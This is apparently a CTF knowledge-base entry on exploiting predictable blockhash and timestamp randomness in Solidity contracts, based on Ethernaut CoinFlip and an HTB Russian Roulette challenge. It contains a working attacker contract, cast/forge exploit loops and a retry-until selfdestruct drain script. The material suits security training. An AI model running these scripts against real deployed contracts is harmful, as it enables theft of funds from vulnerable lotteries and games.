---
id: web3-weak-onchain-randomness-blockhash
category: WEB
tags: [web3, blockchain, evm, solidity, randomness, prng, blockhash, block-timestamp, block-prevrandao, block-number, predictable, coinflip, lottery, guess, attacker-contract, same-block, chainlink-vrf, ethernaut, cast, foundry, russian-roulette, selfdestruct, retry-until, drain-balance, htb, cyber-apocalypse]
tools: [Web3]
manuals: ["Manuals/Web3/3. Contexto para Claude.md"]
title: "Web3: predictable on-chain randomness (blockhash/timestamp) replicated by an attacker contract"
difficulty: easy
created: 2026-10-08
updated: 2026-10-08
related: [web3-receive-fallback-weak-access-control, web3-constructor-typo-exposed-initializer]
---

## How to recognize this pattern

- A **"guess / lottery / random / coin flip"** challenge where the contract decides the outcome from
  block data: `blockhash(block.number-1)`, `block.timestamp`, `block.prevrandao` (formerly
  `block.difficulty`), `block.number`, `blockhash(block.number)`.
- **Nothing on-chain is secret or random**: all of it is public and deterministic. Real randomness
  needs an external oracle (Chainlink VRF). If the "randomness" comes from the block → exploitable.
- First question for this vector: **"can I compute it off-chain?"** vs **"do I need a contract in the
  same block?"** (see the decision below; it's worth gold).

## Method

Reference case: **Ethernaut, CoinFlip**. `side = uint256(blockhash(block.number-1)) / FACTOR == 1`.
Anyone reads the same blockhash and does the same math → always wins. The `lastHash == blockValue`
guard limits it to **1 flip per block** (you can't close out all 10 in a single tx).

Toolchain: Foundry (`cast`/`forge`). See `Manuals/Web3/3. Contexto para Claude.md`.

### Variant: retry-until + selfdestruct drain (HTB CA 2024, Russian Roulette)

Not every case requires "guessing right": sometimes the winning condition is **probabilistic per
block** and you just **repeat until it hits**. `pullTrigger()` does `selfdestruct(payable(msg.sender))`
when `uint256(blockhash(block.number-1)) % 10 == 7` (1/10 per block); win = `TARGET.balance == 0`.

```solidity
function pullTrigger() public returns (string memory) {
    if (uint256(blockhash(block.number - 1)) % 10 == 7) { selfdestruct(payable(msg.sender)); }
    else { return "im SAFU ... for now"; }
}
```
There's nothing to compute: the previous block's blockhash is already sealed by the time your tx
mines. Spam it:
```bash
until [ "$($CAST call $SETUP 'isSolved()(bool)' --rpc-url $RPC)" = "true" ]; do
  $CAST send $TARGET "pullTrigger()" --rpc-url $RPC --private-key $PK
done     # ~10 tx on average; selfdestruct zeroes the balance -> isSolved()
```
Extra lesson: when the win condition is a **state reachable by block lottery** (and not a guess to
match), the attack is **retry-until**, not prediction. `selfdestruct` still drains balance even
post-Cancun (it just no longer deletes the code), enough to zero out `balance`.

### Decision: off-chain (cast) vs attacker contract

| Situation | Approach |
|---|---|
| Victim uses an **already-sealed** block (`block.number-1`) and stable timing | you can compute it **off-chain** with `cast` |
| Victim uses the **current** block, OR you need to read the victim's return and react in the same tx, OR timing is uncertain (testnet) | **attacker contract** (reads blockhash and calls the victim in the SAME tx, atomic) |

> On a real testnet (Sepolia), prefer the **attacker contract**: the `cast` loop has a race; if the
> chain advances between your computation and the tx being mined, the `block.number-1` of the block
> your tx lands in is different → wrong guess → **resets the streak**. The attacker always wins
> because it's atomic.

### Attacker contract (recommended)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface ICoinFlip { function flip(bool) external returns (bool); }
contract Attacker {
    ICoinFlip public target;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    constructor(address _t) { target = ICoinFlip(_t); }
    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        target.flip((blockValue / FACTOR) == 1);   // replicates the victim's math
    }
}
```

```bash
CAST=~/.config/.foundry/bin/cast; FORGE=~/.config/.foundry/bin/forge
RPC="<rpc>"; PK="<private key>"; TARGET="<vulnerable instance>"
$FORGE create src/Attacker.sol:Attacker --rpc-url $RPC --private-key $PK --broadcast --constructor-args $TARGET
ATK=<deployed address "Deployed to:">
$CAST call $ATK "target()(address)" --rpc-url $RPC      # sanity: == $TARGET
for i in $(seq 1 10); do
  $CAST send $ATK "attack()" --rpc-url $RPC --private-key $PK
  echo "flip $i | wins=$($CAST call $TARGET 'consecutiveWins()(uint256)' --rpc-url $RPC)"
  sleep 15   # 1 tx per block; otherwise it reverts on the lastHash guard
done
```

### Off-chain, cast only (when timing is controlled, e.g. local anvil, 1 block/tx)

```bash
FACTOR=57896044618658097711785492504343953926634992332820282019728792003956564819968
bh=$($CAST block $(($($CAST block-number --rpc-url $RPC)-1)) --rpc-url $RPC --json | jq -r '.hash')
side=$(python3 -c "print('true' if (int('$bh',16)//$FACTOR)==1 else 'false')")
$CAST send $TARGET "flip(bool)" $side --rpc-url $RPC --private-key $PK
```

## Gotchas

- **1 tx per block:** the `lastHash == blockValue` guard reverts two calls in the same block. On anvil
  each tx is already a new block; on a testnet use `sleep` ≥ block time (~12s on Sepolia).
- The attacker contract **does not save** the N blocks (the guard is per block), it only guarantees
  **correctness**.
- You need **gas** (testnet ETH from a faucet). The private key stays only in the terminal, never in
  chat, not even on a testnet.
- Validate the on-chain objective (`consecutiveWins()`/`isSolved()`) before submitting; validate the flag against the CTF's configured flag format before declaring success.

## Transferable lesson

Any on-chain "random/guess/lottery": (1) identify the source of randomness (blockhash, timestamp,
prevrandao), (2) replicate the computation, (3) decide off-chain vs same-block. `blockhash`/`timestamp`
of the current block, or return-dependent → atomic attacker contract. Already-sealed block and stable
timing → `cast` off-chain.

## Related / Cross-reference

- `Arsenal/WEB/web3-receive-fallback-weak-access-control.md`, `web3-constructor-typo-exposed-initializer.md`
- `Manuals/Web3/3. Contexto para Claude.md`: `cast`/`forge`/`heimdall` and the `instance.json` flow.
